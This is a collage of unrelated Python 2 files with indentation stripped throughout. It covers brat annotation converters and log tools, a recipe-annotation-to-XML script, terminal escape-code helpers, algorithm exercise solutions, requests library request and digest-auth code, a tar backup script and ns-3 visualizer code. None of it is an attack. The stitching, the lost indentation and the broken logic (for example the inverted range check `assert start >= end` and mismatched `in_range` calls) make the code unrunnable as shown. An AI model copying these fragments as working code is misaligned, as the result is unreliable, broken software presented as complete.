id_, type_target_ref, reftext = fields
type_, target, ref = type_target_ref.split(' ')
return Normalization(id_, type_, target, ref, reftext)
def parse_note(fields):
id_, type_target, text = fields
type_, target = type_target.split(' ')
return Note(id_, type_, target, text)
def parse_equiv(fields):
id_, type_targets = fields
type_targets = type_targets.split(' ')
type_, targets = type_targets[0], type_targets[1:]
return Equiv(id_, type_, targets)
parse_func = {
'T': parse_textbound,
'R': parse_relation,
'E': parse_event,
'N': parse_normalization,
'M': parse_attribute,
'A': parse_attribute,
'#': parse_note,
'*': parse_equiv,
}
def parse(l, ln):
assert len(l) and l[0] in parse_func, "Error on line %d: %s" % (ln, l)
try:
return parse_func[l[0]](l.split('\t'))
except Exception:
assert False, "Error on line %d: %s" % (ln, l)
def process(fn, selection):
with open(fn, "rU") as f:
lines = [l.rstrip('\n') for l in f.readlines()]
annotations = []
for i, l in enumerate(lines):
annotations.append(parse(l, i+1))
for a in annotations:
if not a.in_range(selection):
raise NotImplementedError('Deletion of annotations TODO')
else:
a.remap(selection)
for a in annotations:
print a
class Selection(object):
def __init__(self, options):
self.complement = options.complement
if options.characters is None:
raise ArgumentError('Please specify the charaters')
self.ranges = []
for range in options.characters.split(','):
try:
start, end = range.split('-')
start, end = int(start), int(end)
assert start >= end and start >= 1
start -= 1
self.ranges.append((start, end))
except Exception:
raise ArgumentError('Invalid range "%s"' % range)
self.ranges.sort()
self.offset_map = {}
o, m = 0, 0
if not self.complement:
for start, end in self.ranges:
while o < start:
self.offset_map[o] = None
o += 1
while o < end:
self.offset_map[o] = m
o += 1
m += 1
else:
for start, end in self.ranges:
while o < start:
self.offset_map[o] = m
o += 1
m += 1
while o < end:
self.offset_map[o] = None
o += 1
self.max_offset = o
self.max_mapped = m
def in_range(self, start, end):
for rs, re in self.ranges:
if start >= rs and start < re:
if end >= rs and end < re:
return not self.complement
else:
raise NotImplementedError('Annotations partially included in range not supported')
return self.complement
def remap_single(self, offset):
assert offset >= 0, "INTERNAL ERROR"
if offset < self.max_offset:
assert offset in self.offset_map, "INTERNAL ERROR"
o = self.offset_map[offset]
assert o is not None, "Error: remap for excluded offset %d" % offset
return o
else:
assert self.complement, "Error: remap for excluded offset %d" % offset
return self.max_mapped + (offset-self.max_offset)
def remap(self, start, end):
end -= 1
start, end = self.remap_single(start), self.remap_single(end)
end += 1
return (start, end)
def main(argv=None):
if argv is None:
argv = sys.argv
arg = argparser().parse_args(argv[1:])
try:
selection = Selection(arg)
except Exception, e:
print >> sys.stderr, e
argparser().print_help()
return 1
for fn in arg.file:
process(fn, selection)
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
from argparse import ArgumentParser
ARGPARSER = ArgumentParser()
ARGPARSER.add_argument('ann_log', nargs='+')
from collections import namedtuple
from datetime import datetime
from sys import stderr
LogLine = namedtuple('LogLine', ('time', 'user', 'collection', 'document',
'state', 'action', 'line_no'))
def _parse_log_iter(log):
for line_no, line in enumerate((l.rstrip('\n') for l in log)):
date_stamp, time_stamp, user, collection, document, state, action = line.split()[:7]
dtime = datetime.strptime('%s %s' % (date_stamp, time_stamp, ),
'%Y-%m-%d %H:%M:%S,%f')
yield LogLine(
time=dtime,
user=user,
collection=collection,
document=document,
state=state,
action=action,
line_no=line_no,
)
Action = namedtuple('Action', ('start', 'end', 'action'))
def _action_iter(log_lines):
start_by_action = {}
for log_line in log_lines:
if log_line.state == 'START':
start_by_action[log_line.action] = log_line
elif log_line.state == 'FINISH':
start_line = start_by_action[log_line.action]
del start_by_action[log_line.action]
yield Action(start=start_line, end=log_line,
action=log_line.action)
def main(args):
argp = ARGPARSER.parse_args(args[1:])
for ann_log_path in argp.ann_log:
with open(ann_log_path, 'r') as ann_log:
log_lines = []
for log_line in _parse_log_iter(ann_log):
assert log_line.state in set(('START', 'FINISH',) ), 'unknown logged state'
log_lines.append(log_line)
clock_time = log_lines[-1].time - log_lines[0].time
print >> stderr, 'Clock time:', clock_time
from datetime import timedelta
ann_time = timedelta()
last_span_selected = None
for action in _action_iter(log_lines):
if (action.action == 'spanSelected'
or action.action == 'spanEditSelected'
or action.action == 'suggestSpanTypes'):
last_span_selected = action
if action.action == 'createSpan':
ann_time = ann_time + (action.end.time - last_span_selected.start.time)
last_span_selected = None
ann_port_of_clock = float(ann_time.seconds) / clock_time.seconds
print >> stderr, 'Annotation time: %s (portion of clock time: %.1f%%)' % (
ann_time, ann_port_of_clock * 100, )
if __name__ == '__main__':
from sys import argv
exit(main(argv))
from __future__ import with_statement
import sys
import re
import os
from collections import namedtuple
from os import path
from subprocess import Popen, PIPE
from cStringIO import StringIO
import io
sys.path.append(os.path.join(os.path.dirname(__file__), '../server/src'))
sys.path.append('.')
from sentencesplit import sentencebreaks_to_newlines
options = None
EMPTY_LINE_RE = re.compile(r'^\s*$')
CONLL_LINE_RE = re.compile(r'^\S+\t\d+\t\d+.')
class FormatError(Exception):
pass
def argparser_internal():
import argparse
ap=argparse.ArgumentParser(description='Convert text and standoff ' +
'annotations into CoNLL format.')
ap.add_argument('-a', '--annsuffix', default=".ann",
help='Standoff annotation file suffix (default "ann")')
ap.add_argument('-c', '--singleclass', default=None,
help='Use given single class for annotations')
ap.add_argument('-n', '--nosplit', default=False, action='store_true',
help='No sentence splitting')
ap.add_argument('-o', '--outsuffix', default=".conll",
help='Suffix to add to output files (default "conll")')
ap.add_argument('-v', '--verbose', default=False, action='store_true',
help='Verbose output')
return ap
def argparser():
ap = argparser_internal()
ap.add_argument('text', metavar='TEXT', nargs='+',
help='Text files ("-" for STDIN)')
return ap
def read_sentence(f):
lines = []
for l in f:
lines.append(l)
if EMPTY_LINE_RE.match(l):
break
if not CONLL_LINE_RE.search(l):
raise FormatError('Line not in CoNLL format: "%s"' % l.rstrip('\n'))
return lines
def strip_labels(lines):
labels, stripped = [], []
labels = []
for l in lines:
if EMPTY_LINE_RE.match(l):
labels.append(None)
stripped.append(l)
else:
fields = l.split('\t')
labels.append(fields[0])
stripped.append('\t'.join(fields[1:]))
return labels, stripped
def attach_labels(labels, lines):
assert len(labels) == len(lines), "Number of labels (%d) does not match number of lines (%d)" % (len(labels), len(lines))
attached = []
for label, line in zip(labels, lines):
empty = EMPTY_LINE_RE.match(line)
assert (label is None and empty) or (label is not None and not empty)
if empty:
attached.append(line)
else:
attached.append('%s\t%s' % (label, line))
return attached
TOKENIZATION_REGEX = re.compile(r'([0-9a-zA-Z]+|[^0-9a-zA-Z])')
NEWLINE_TERM_REGEX = re.compile(r'(.*?\n)')
def conll_to_standford(lines):
new_lines = []
for l in lines:
if l:
tag = l[0]
token = l[3]
if tag.startswith("I-") or tag.startswith("B-"):
pass
new_lines.append([token, tag])
else:
pass
return new_lines
def strip_xml_tag(lines):
hm = {
"<": ">",
"[": "]",
}
i = 0
while i<len(lines):
if lines[i][0] in hm:
j = i+1
while j<len(lines):
if lines[j][0]==hm[lines[i][0]]:
lines = lines[:i]+lines[j+1:]
break
j += 1
if j==len(lines):
i += 1
else:
i += 1
return lines
def text_to_conll_lines(f):
global options
if not options:
options = argparser_internal().parse_args(None)
if options.nosplit:
sentences = f.readlines()
else:
sentences = []
for l in f:
l = sentencebreaks_to_newlines(l)
sentences.extend([s for s in NEWLINE_TERM_REGEX.split(l) if s])
lines = []
offset = 0
for s in sentences:
nonspace_token_seen = False
tokens = [t for t in TOKENIZATION_REGEX.split(s) if t]
for t in tokens:
if not t.isspace():
lines.append(['O', offset, offset+len(t), t])
nonspace_token_seen = True
offset += len(t)
if nonspace_token_seen:
lines.append([])
if options.annsuffix:
lines = relabel(lines, get_annotations(f.name))
lines = [[l[0], str(l[1]), str(l[2]), l[3]] if l else l for l in lines]
lines = conll_to_standford(lines)
lines = strip_xml_tag(lines)
return lines
def text_to_conll(f):
lines = text_to_conll_lines(f)
output = u'\n'.join((u'\t\t'.join(l) for l in lines))
return StringIO(output.encode("utf-8"))
def relabel(lines, annotations):
global options
offset_label = {}
for tb in annotations:
for i in range(tb.start, tb.end):
if i in offset_label:
print >> sys.stderr, "Warning: overlapping annotations"
offset_label[i] = tb
prev_label = None
for i, l in enumerate(lines):
if not l:
prev_label = None
continue
tag, start, end, token = l
label = None
for o in range(start, end):
if o in offset_label:
if o != start:
print >> sys.stderr, 'Warning: annotation-token boundary mismatch: "%s" --- "%s"' % (token, offset_label[o].text)
label = offset_label[o].type
break
if label is not None:
if label == prev_label:
tag = 'I-'+label
else:
tag = 'B-'+label
prev_label = label
lines[i] = [tag, start, end, token]
if options.singleclass:
for l in lines:
if l and l[0] != 'O':
l[0] = l[0][:2]+options.singleclass
return lines
def process(f):
return text_to_conll(f)
def process_files(files):
global options
nersuite_proc = []
try:
for fn in files:
try:
if fn == '-':
lines = process(sys.stdin)
else:
with io.open(fn, 'r', newline='', encoding="utf-8") as f:
lines = process(f)
if lines is None:
raise FormatError
if fn == '-' or not options.outsuffix:
sys.stdout.write(''.join(lines))
else:
ofn = path.splitext(fn)[0]+options.outsuffix
with io.open(ofn, 'wt', newline='', encoding="utf-8") as of:
output = ''.join(lines)
output = output.decode("utf-8")
of.write(output)
except:
raise
except Exception, e:
for p in nersuite_proc:
p.kill()
if not isinstance(e, FormatError):
raise
TEXTBOUND_LINE_RE = re.compile(r'^T\d+\t')
Textbound = namedtuple('Textbound', 'start end type text')
def parse_textbounds(f):
textbounds = []
for l in f:
l = l.rstrip('\n')
if not TEXTBOUND_LINE_RE.search(l):
continue
id_, type_offsets, text = l.split('\t')
type_, span = type_offsets.split(" ", 1)
span = span.split(" ")
start, end = int(span[0]), int(span[-1])
textbounds.append(Textbound(start, end, type_, text))
return textbounds
def eliminate_overlaps(textbounds):
eliminate = {}
for t1 in textbounds:
for t2 in textbounds:
if t1 is t2:
continue
if t2.start >= t1.end or t2.end <= t1.start:
continue
if t1.end-t1.start > t2.end-t2.start:
print >> sys.stderr, "Eliminate %s due to overlap with %s" % (t2, t1)
eliminate[t2] = True
else:
print >> sys.stderr, "Eliminate %s due to overlap with %s" % (t1, t2)
eliminate[t1] = True
return [t for t in textbounds if not t in eliminate]
def get_annotations(fn):
global options
annfn = path.splitext(fn)[0]+options.annsuffix
with open(annfn, 'rU') as f:
textbounds = parse_textbounds(f)
textbounds = eliminate_overlaps(textbounds)
return textbounds
def main(argv=None):
if argv is None:
argv = sys.argv
global options
options = argparser().parse_args(argv[1:])
if options.outsuffix and options.outsuffix[0] != '.':
options.outsuffix = '.'+options.outsuffix
if options.annsuffix and options.annsuffix[0] != '.':
options.annsuffix = '.'+options.annsuffix
process_files(options.text)
if __name__ == "__main__":
sys.exit(main(sys.argv))
import os
import operator
class  EntityTag(object):
def __init__(self, tag=None, start=None, end=None, content=None):
super( EntityTag, self).__init__()
self.tag = tag
self.start = start
self.end = end
self.content = content
def __repr__(self):
return str((self.tag, self.start, self.end))
def __str__(self):
return str((self.tag, self.start, self.end))
class Relation(object):
def __init__(self, unit=None, ingredient=None, amount=None):
super(Relation, self).__init__()
self.unit = unit
self.ingredient = ingredient
self.amount = amount
def __repr__(self):
tmp = ""
if self.amount:
tmp = tmp + self.amount+" "
if self.unit:
tmp = tmp + self.unit + " of "
tmp += self.ingredient
return tmp
def __str__(self):
tmp = ""
if self.amount:
tmp = tmp + self.amount+" "
if self.unit:
tmp = tmp + self.unit + " of "
tmp += self.ingredient
return tmp
def add(self, type, part1, part2, tag_index_dict):
ingredient_index = part2.split(":")[-1]
self.ingredient = tag_index_dict.get(ingredient_index)
part1_index = part1.split(":")[-1]
part1_content = tag_index_dict.get(part1_index)
if type == "Quantify":
self.amount = part1_content
elif type == "Measure":
self.unit = part1_content
pass
def ann_to_xml(ann_entities, xml_path, txt_path):
import codecs
txt_file = codecs.open(txt_path,'r','utf-8')
txt_raw = txt_file.read()
txt_file.close()
xml_file = codecs.open(xml_path, "w+",'utf-8')
tags = []
relations_dict = {}
tag_index_dict = {}
for ann_entity in ann_entities:
if ann_entity.startswith("T"):
tag_index, annotation, tagged_text= ann_entity.strip().split("\t")
tag, tmp = annotation.split(" ", 1)
tmp = tmp.split(" ")
start = int(tmp[0])
end = int(tmp[-1])
try:
assert tagged_text.strip() == txt_raw[start:end].replace("\n", " ").strip()
except AssertionError:
print "Something Wront with entity: " + ann_entity
print tagged_text.strip()
print txt_raw[start:end].replace("\n", " ").strip()
tag_entity = EntityTag(tag, start, end, tagged_text)
tags.append(tag_entity)
tag_index_dict[tag_index] = tagged_text
elif ann_entity.startswith("R"):
relation_index, annotation = ann_entity.strip().split("\t")
rel_type, part1, part2 = annotation.split(" ")
ingredient_index = part2.split(":")[-1]
relation = relations_dict.get(ingredient_index, Relation())
relation.add(rel_type, part1, part2, tag_index_dict)
relations_dict[ingredient_index] = relation
tags.sort(key=operator.attrgetter('start'), reverse=True)
ner_tpl = "<entity type=\"%s\">%s</entity>"
for tag in tags:
txt_raw = txt_raw[:tag.start]+ ner_tpl % (tag.tag, txt_raw[tag.start:tag.end]) + txt_raw[tag.end:]
xml_file.write(txt_raw)
xml_file.close()
return relations_dict
def format_directory(top):
for root, dirs, files in os.walk(top):
for file_name in files:
if file_name.endswith(".ann"):
format_file(os.path.join(root, file_name))
def format_file(file_path):
import codecs
ann_file = codecs.open(file_path, 'r',"utf-8")
ann_entities = [line for line in ann_file]
ann_file.close()
xml_path = file_path.replace(".ann", ".xml")
txt_path = file_path.replace(".ann", ".txt")
return ann_to_xml(ann_entities, xml_path, txt_path)
def get_relation_set(file_path):
relation_all = format_file(file_path)
result_set = set()
for _, relation in relation_all.items():
relation_dict = dict()
if relation.ingredient:
relation_dict["ingredient"] = relation.ingredient
if relation.unit:
relation_dict["unit"] = relation.unit
if relation.amount:
relation_dict["amount"] = relation.amount
result_set.add(str(relation_dict))
return result_set
if __name__ == '__main__':
current_directory = os.path.dirname(os.path.realpath(__file__))
format_directory(current_directory)
import sys
BOLD = "\x1b[1m"
CLEAR_FORMATTING = "\x1b[0m"
ERASE_SCREEN = "\x1b[J"
ERASE_LINE = "\x1b[2K"
FOREGROUND_BLACK = "\x1b[30m"
BACKGROUND_WHITE = "\x1b[47m"
def _CURSOR_COLUMN(pos):
c = "\x1b[1000D"
if pos:
c += "\x1b["+str(pos - 1)+"C"
return c
def _CURSOR_PREVIOUS_LINES(number):
return "\x1b["+str(number)+"A"
def _CURSOR_NEXT_LINES(number):
return "\x1b["+str(number)+"B"
def select_text(text):
return  (FOREGROUND_BLACK +
BACKGROUND_WHITE +
text.replace(
CLEAR_FORMATTING,
CLEAR_FORMATTING + FOREGROUND_BLACK + BACKGROUND_WHITE)+
CLEAR_FORMATTING)
def bold_text(text):
return  (BOLD +
text.replace(
CLEAR_FORMATTING,
CLEAR_FORMATTING + BOLD)+
CLEAR_FORMATTING)
def move_cursor_line_beggining():
sys.stdout.write(_CURSOR_COLUMN(0))
def move_cursor_horizental(n):
sys.stdout.write(_CURSOR_COLUMN(n))
def move_cursor_previous_lines(number_of_lines):
sys.stdout.write(_CURSOR_PREVIOUS_LINES(number_of_lines))
def move_cursor_next_lines(number_of_lines):
sys.stdout.write(_CURSOR_NEXT_LINES(number_of_lines))
def erase_from_cursor_to_end():
sys.stdout.write(ERASE_SCREEN)
def erase_line():
sys.stdout.write(ERASE_LINE)
def flush():
sys.stdout.flush()
MOD = 10 ** 9 + 7
class Solution(object):
def solve(self, cipher):
N, M = cipher
s = M
if N > 1:
s *= (M - 1)
if N > 2:
s *= pow(M - 2, N - 2, MOD)
s %= MOD
return s % MOD
def _exp(self, a, b):
ret = 1
b %= MOD
while b > 0:
if b & 1 == 0:
b /= 2
a *= a
a %= MOD
else:
ret *= a
ret %= MOD
b -= 1
return ret
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
from . import sessions
def request(method, url, **kwargs):
session = sessions.Session()
return session.request(method=method, url=url, **kwargs)
def get(url, **kwargs):
kwargs.setdefault('allow_redirects', True)
return request('get', url, **kwargs)
def options(url, **kwargs):
kwargs.setdefault('allow_redirects', True)
return request('options', url, **kwargs)
def head(url, **kwargs):
return request('head', url, **kwargs)
def post(url, data=None, **kwargs):
return request('post', url, data=data, **kwargs)
def put(url, data=None, **kwargs):
return request('put', url, data=data, **kwargs)
def patch(url, data=None, **kwargs):
return request('patch', url,  data=data, **kwargs)
def delete(url, **kwargs):
return request('delete', url, **kwargs)
from collections import deque
class MaxProductSolution(object):
def solve(self, A):
q = deque([A[0]])
maxa = 0
for e in A[1:]:
while q and q[0] < e:
maxa = max(maxa, q[0]*e)
q.popleft()
q.append(e)
return maxa
if __name__ == "__main__":
assert MaxProductSolution().solve([1, 6, 2, 3, 6, 4, 9, 5, 10]) == 90
import os
import time
import hashlib
import logging
from base64 import b64encode
from .compat import urlparse, str
from .utils import parse_dict_header
log = logging.getLogger(__name__)
CONTENT_TYPE_FORM_URLENCODED = 'application/x-www-form-urlencoded'
CONTENT_TYPE_MULTI_PART = 'multipart/form-data'
def _basic_auth_str(username, password):
return 'Basic ' + b64encode(('%s:%s' % (username, password)).encode('latin1')).strip().decode('latin1')
class AuthBase(object):
def __call__(self, r):
raise NotImplementedError('Auth hooks must be callable.')
class HTTPBasicAuth(AuthBase):
def __init__(self, username, password):
self.username = username
self.password = password
def __call__(self, r):
r.headers['Authorization'] = _basic_auth_str(self.username, self.password)
return r
class HTTPProxyAuth(HTTPBasicAuth):
def __call__(self, r):
r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)
return r
class HTTPDigestAuth(AuthBase):
def __init__(self, username, password):
self.username = username
self.password = password
self.last_nonce = ''
self.nonce_count = 0
self.chal = {}
def build_digest_header(self, method, url):
realm = self.chal['realm']
nonce = self.chal['nonce']
qop = self.chal.get('qop')
algorithm = self.chal.get('algorithm', 'MD5')
opaque = self.chal.get('opaque', None)
algorithm = algorithm.upper()
if algorithm == 'MD5':
def md5_utf8(x):
if isinstance(x, str):
x = x.encode('utf-8')
return hashlib.md5(x).hexdigest()
hash_utf8 = md5_utf8
elif algorithm == 'SHA':
def sha_utf8(x):
if isinstance(x, str):
x = x.encode('utf-8')
return hashlib.sha1(x).hexdigest()
hash_utf8 = sha_utf8
KD = lambda s, d: hash_utf8("%s:%s" % (s, d))
if hash_utf8 is None:
return None
entdig = None
p_parsed = urlparse(url)
path = p_parsed.path
if p_parsed.query:
path += '?' + p_parsed.query
A1 = '%s:%s:%s' % (self.username, realm, self.password)
A2 = '%s:%s' % (method, path)
if qop == 'auth':
if nonce == self.last_nonce:
self.nonce_count += 1
else:
self.nonce_count = 1
ncvalue = '%08x' % self.nonce_count
s = str(self.nonce_count).encode('utf-8')
s += nonce.encode('utf-8')
s += time.ctime().encode('utf-8')
s += os.urandom(8)
cnonce = (hashlib.sha1(s).hexdigest()[:16])
noncebit = "%s:%s:%s:%s:%s" % (nonce, ncvalue, cnonce, qop, hash_utf8(A2))
respdig = KD(hash_utf8(A1), noncebit)
elif qop is None:
respdig = KD(hash_utf8(A1), "%s:%s" % (nonce, hash_utf8(A2)))
else:
return None
self.last_nonce = nonce
base = 'username="%s", realm="%s", nonce="%s", uri="%s", ' \
'response="%s"' % (self.username, realm, nonce, path, respdig)
if opaque:
base += ', opaque="%s"' % opaque
if entdig:
base += ', digest="%s"' % entdig
base += ', algorithm="%s"' % algorithm
if qop:
base += ', qop=auth, nc=%s, cnonce="%s"' % (ncvalue, cnonce)
return 'Digest %s' % (base)
def handle_401(self, r):
num_401_calls = r.request.hooks['response'].count(self.handle_401)
s_auth = r.headers.get('www-authenticate', '')
if 'digest' in s_auth.lower() and num_401_calls < 2:
self.chal = parse_dict_header(s_auth.replace('Digest ', ''))
r.content
r.raw.release_conn()
r.request.headers['Authorization'] = self.build_digest_header(r.request.method, r.request.url)
_r = r.connection.send(r.request)
_r.history.append(r)
return _r
return r
def __call__(self, r):
if self.last_nonce:
r.headers['Authorization'] = self.build_digest_header(r.method, r.url)
r.register_hook('response', self.handle_401)
return r
import sys
import re
try:
import cElementTree as ET
except:
import xml.etree.cElementTree as ET
EXCLUDED_TAGS = [
"SURNAME",
"AUTHOR",
"REFERENCE",
"AUTHORLIST",
"JOURNAL",
"YEAR",
"P",
"TITLE",
"DIV",
"HEADER",
"FIGURE",
"XREF",
"CURRENT_SURNAME",
"CURRENT_AUTHOR",
"FOOTNOTE",
"DATE",
"TABLE",
"CURRENT_NAME",
"EQN",
"EQ-S",
"ISSUE",
"REFERENCELIST",
"PAPER",
"METADATA",
"FILENO",
"FIGURELIST",
"CURRENT_TITLE",
"CURRENT_AUTHORLIST",
"BODY",
"ABSTRACT",
"FOOTNOTELIST",
"TABLELIST",
"ACKNOWLEDGMENTS",
"REF",
]
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }
ELIDED_TEXT_STRING = "[[[...]]]"
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000
def c_escape(s):
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')
def strip_ns(tag):
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)
class Standoff:
def __init__(self, sid, element, start, end, text):
self.sid     = sid
self.element = element
self.start   = start
self.end     = end
self.text    = text
def strip(self):
while self.start < self.end and self.text[0].isspace():
self.start += 1
self.text = self.text[1:]
while self.start < self.end and self.text[-1].isspace():
self.end -= 1
self.text = self.text[:-1]
def compress_text(self, l):
if len(self.text) >= l:
el = len(ELIDED_TEXT_STRING)
sl = (l-el)/2
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])
def tag(self):
return strip_ns(self.element.tag)
def attrib(self):
attrib = {}
for a in self.element.attrib:
if a[0] == "{":
an = re.sub(r'\{.*?\}', '', a)
else:
an = a
attrib[an] = self.element.attrib[a]
return attrib
def __str__(self):
return "X%d\t%s %d %d\t%s\t%s" % \
(self.sid, self.tag(), self.start, self.end,
c_escape(self.text.encode("utf-8")),
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))
for k,v in self.attrib().items()]))
def txt(s):
return s if s is not None else ""
next_free_so_id = 1
def text_and_standoffs(e, curroff=0, standoffs=None):
global next_free_so_id
if standoffs == None:
standoffs = []
startoff = curroff
so = Standoff(next_free_so_id, e, 0, 0, "")
next_free_so_id += 1
standoffs.append(so)
setext, dummy = subelem_text_and_standoffs(e, curroff+len(txt(e.text)), standoffs)
text = txt(e.text) + setext
curroff += len(text)
so.start = startoff
so.end   = curroff
so.text  = text
return (text, standoffs)
def subelem_text_and_standoffs(e, curroff, standoffs):
startoff = curroff
text = ""
for s in e:
stext, dummy = text_and_standoffs(s, curroff, standoffs)
text += stext
text += txt(s.tail)
curroff = startoff + len(text)
return (text, standoffs)
NORM_SPACE_REGEX = re.compile(r'\s+')
def normalize_space(e, tags=None):
if tags is None or strip_ns(e.tag) in tags:
if e.text is not None:
n = NORM_SPACE_REGEX.sub(' ', e.text)
e.text = n
if e.tail is not None:
n = NORM_SPACE_REGEX.sub(' ', e.tail)
e.tail = n
if strip_ns(e.tag) in ('S', 'A-S'):
e.tail = e.tail + '\n' if e.tail else '\n'
for c in e:
normalize_space(c)
def generate_id(prefix):
if prefix not in generate_id._next:
generate_id._next[prefix] = 1
id_ = prefix+str(generate_id._next[prefix])
generate_id._next[prefix] += 1
return id_
generate_id._next = {}
def convert_s(s):
sostrings = []
tid = generate_id('T')
type_ = s.attrib()['AZ'] if 'AZ' in s.attrib() else 'UNDEF'
sostrings.append('%s\t%s %d %d\t%s' % \
(tid, type_, s.start, s.end, s.text.encode("utf-8")))
return sostrings
convert_function = {
"S" : convert_s,
"A-S" : convert_s,
}
def main(argv=[]):
if len(argv) != 4:
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"
return -1
in_fn, out_txt_fn, out_so_fn = argv[1:]
if in_fn == "-":
in_fn = "/dev/stdin"
if out_txt_fn == "-":
out_txt_fn = "/dev/stdout"
if out_so_fn == "-":
out_so_fn = "/dev/stdout"
tree = ET.parse(in_fn)
root = tree.getroot()
normalize_space(root, ['S', 'A-S'])
text, standoffs = text_and_standoffs(root)
for s in standoffs:
s.strip()
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]
converted = []
for s in standoffs:
if s.tag() in convert_function:
converted.extend(convert_function[s.tag()](s))
else:
converted.append(s)
standoffs = converted
for so in standoffs:
try:
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)
except AttributeError:
pass
out_txt = open(out_txt_fn, "wt")
out_so  = open(out_so_fn, "wt")
out_txt.write(text.encode("utf-8"))
for so in standoffs:
print >> out_so, so
out_txt.close()
out_so.close()
if __name__ == "__main__":
sys.exit(main(sys.argv))
class Solution(object):
def solve(self, cipher):
return sum(cipher) / 2.0
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
N = int(f.readline().strip())
cipher = []
for _ in xrange(N):
cipher.append(int(f.readline().strip()))
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution:
def backPackII(self, m, A, V):
n = len(A)
f = [0 for _ in xrange(m+1)]
for i in xrange(1, n+1):
copy = list(f)
for j in xrange(1, m+1):
if j-A[i-1]>=0:
f[j] = max(copy[j], copy[j-A[i-1]]+V[i-1])
else:
f[j] = copy[j]
return f[m]
class Solution(object):
def backPack(self, m, A):
n = len(A)
f = [0 for _ in xrange(m+1)]
for i in xrange(1, n+1):
copy = list(f)
for j in xrange(1, m+1):
if j-A[i-1] >= 0:
f[j] = max(copy[j], copy[j-A[i-1]]+A[i-1])
else:
f[j] = copy[j]
return f[m]
class Solution_TLE(object):
def backPack(self, m, A):
result = [0]
self.dfs(A, 0, m, result)
return result[0]
def dfs(self, seq, cur, m, result):
if cur > m:
return
result[0] = max(result[0], cur)
if seq:
self.dfs(seq[1:], cur+seq[0], m, result)
self.dfs(seq[1:], cur, m, result)
class Solution_MLE(object):
def backPack(self, m, A):
n = len(A)
f = [[0 for _ in xrange(m+1)] for _ in xrange(n+1)]
for i in xrange(1, n+1):
for j in xrange(1, m+1):
if j-A[i-1] >= 0:
f[i][j] = max(f[i-1][j], f[i-1][j-A[i-1]]+A[i-1])
else:
f[i][j] = f[i-1][j]
return f[n][m]
if __name__ == "__main__":
print Solution().backPack(11, [2, 3, 5, 7])
from datetime import datetime
from os import mkdir, remove
from os.path import dirname, exists, basename
from os.path import join as path_join
from shlex import split as shlex_split
from subprocess import Popen
from sys import path as sys_path
from sys import stderr as sys_stderr
sys_path.append(path_join(dirname(__file__), '..'))
from config import WORK_DIR, DATA_DIR
TOOL_BACKUP_DIR = path_join(WORK_DIR, 'bckup_tool')
def _safe_dirname(path):
return basename(path) or dirname(dirname(path))
def main(args):
if not exists(TOOL_BACKUP_DIR):
mkdir(TOOL_BACKUP_DIR)
timestamp = datetime.utcnow().strftime('%Y-%m-%dT%H:%M%SZ')
backup_path = path_join(TOOL_BACKUP_DIR, '%s-%s.tar.gz' % (
_safe_dirname(DATA_DIR), timestamp))
data_dir_parent = path_join(DATA_DIR, '..')
tar_cmd = 'tar -c -z -f %s -C %s %s' % (backup_path, data_dir_parent,
_safe_dirname(DATA_DIR))
tar_p = Popen(shlex_split(tar_cmd))
tar_p.wait()
if tar_p.returncode != 0:
remove(backup_path)
return -1
else:
return 0
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import ns.point_to_point
import ns.csma
import ns.wifi
import ns.bridge
import ns.internet
import ns.mesh
import ns.wimax
import ns.wimax
import gobject
import os.path
import sys
PIXELS_PER_METER = 3.0
class PyVizObject(gobject.GObject):
__gtype_name__ = "PyVizObject"
def tooltip_query(self, tooltip):
tooltip.set_text("TODO: tooltip for %r" % self)
class Link(PyVizObject):
pass
class InformationWindow(object):
def update(self):
raise NotImplementedError
class NetDeviceTraits(object):
def __init__(self, is_wireless=None, is_virtual=False):
assert is_virtual or is_wireless is not None
self.is_wireless = is_wireless
self.is_virtual = is_virtual
netdevice_traits = {
ns.point_to_point.PointToPointNetDevice: NetDeviceTraits(is_wireless=False),
ns.csma.CsmaNetDevice: NetDeviceTraits(is_wireless=False),
ns.wifi.WifiNetDevice: NetDeviceTraits(is_wireless=True),
ns.bridge.BridgeNetDevice: NetDeviceTraits(is_virtual=True),
ns.internet.LoopbackNetDevice: NetDeviceTraits(is_virtual=True, is_wireless=False),
ns.mesh.MeshPointDevice: NetDeviceTraits(is_virtual=True),
ns.wimax.SubscriberStationNetDevice: NetDeviceTraits(is_wireless=True),
ns.wimax.BaseStationNetDevice: NetDeviceTraits(is_wireless=True),
}
def lookup_netdevice_traits(class_type):
try:
return netdevice_traits[class_type]
except KeyError:
sys.stderr.write("WARNING: no NetDeviceTraits registered for device type %r; "
"I will assume this is a non-virtual wireless device, "
"but you should edit %r, variable 'netdevice_traits',"
" to make sure.\n" % (class_type.__name__, __file__))
t = NetDeviceTraits(is_virtual=False, is_wireless=True)
netdevice_traits[class_type] = t
return t
def transform_distance_simulation_to_canvas(d):
return d*PIXELS_PER_METER
def transform_point_simulation_to_canvas(x, y):
return x*PIXELS_PER_METER, y*PIXELS_PER_METER
def transform_distance_canvas_to_simulation(d):
return d/PIXELS_PER_METER
def transform_point_canvas_to_simulation(x, y):
return x/PIXELS_PER_METER, y/PIXELS_PER_METER
plugins = []
plugin_modules = {}
def register_plugin(plugin_init_func, plugin_name=None, plugin_module=None):
assert callable(plugin_init_func)
plugins.append(plugin_init_func)
if plugin_module is not None:
plugin_modules[plugin_name] = plugin_module
plugins_loaded = False
def load_plugins():
global plugins_loaded
if plugins_loaded:
return
plugins_loaded = True
plugins_dir = os.path.join(os.path.dirname(__file__), 'plugins')
old_path = list(sys.path)
sys.path.insert(0, plugins_dir)
for filename in os.listdir(plugins_dir):
